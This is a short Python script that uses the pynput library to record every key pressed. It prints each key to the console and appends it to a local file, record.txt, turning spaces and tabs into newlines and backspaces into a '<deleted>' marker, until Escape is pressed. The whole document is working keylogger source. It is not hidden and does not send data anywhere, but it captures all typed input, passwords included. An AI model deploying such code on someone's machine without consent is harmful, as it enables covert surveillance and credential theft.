import pynput
from pynput.keyboard import Key, Listener

keys = []

def press(key):
    global keys, count
    keys.append(key)
    print("{0} pressed".format(key))
    write_to_file(keys)
    keys = [] #reset

# end recording
def release(key):
    if key == Key.esc:
        return False

# function that writes all the keys pressed to a txt file
def write_to_file(keys):
    with open("record.txt", "a") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k == "Key.backspace":
                file.write("<deleted>")
            elif k.find("space") > 0: #every word in new line
                file.write('\n')
            elif k == "Key.tab":
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)
            #file.write(str(key))

#listener loop to listen to all keys pressed
with Listener(on_press = press, on_release = release) as listener:
    listener.join()
